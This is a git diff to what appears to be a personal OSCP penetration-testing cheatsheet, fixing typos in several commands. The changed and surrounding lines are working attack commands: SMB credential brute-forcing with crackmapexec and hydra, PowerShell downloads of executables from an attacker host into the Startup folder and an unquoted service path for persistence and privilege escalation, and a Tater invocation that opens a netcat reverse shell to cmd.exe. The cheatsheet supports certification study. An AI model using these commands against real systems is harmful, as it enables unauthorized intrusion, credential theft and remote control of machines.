@@ -81,6 +81,7 @@ description: "OSCP personal cheatsheet"
   * [Graphical Interface](#graphical-interface)
   
 - [SMB - 445](#smb---445)
+  
   * [Version if nmap didn't detect it](#version-if-nmap-didnt-detect-it)
   * [Scan for vulnerability](#scan-for-vulnerability)
   * [Manual testing](#manual-testing)
@@ -829,7 +830,7 @@ smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
 ### Brute force
 
 ```
-crackmapexec smb<IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 ```
 
@@ -1874,7 +1875,7 @@ sudo nc -lvp <PORT>
 
 # Victim
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', ".\program.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
 
 To execute it with elevated privileges we need to wait for someone in the Admin group to login.
 ```
@@ -1986,7 +1987,7 @@ sudo nc -lvp <PORT>
 
 # Victim
 cd "C:\Program Files\Unquoted Path Service\"
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', ".\Common.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
 sc start unquotedsvc
 ```
 
@@ -2000,8 +2001,8 @@ sudo python -m SimpleHTTPServer 80
 sudo nc -lvp <PORT>
 
 # Victim
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', ".\nc.exe')
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', ".\Tater.ps1.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
 powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
 ```
 
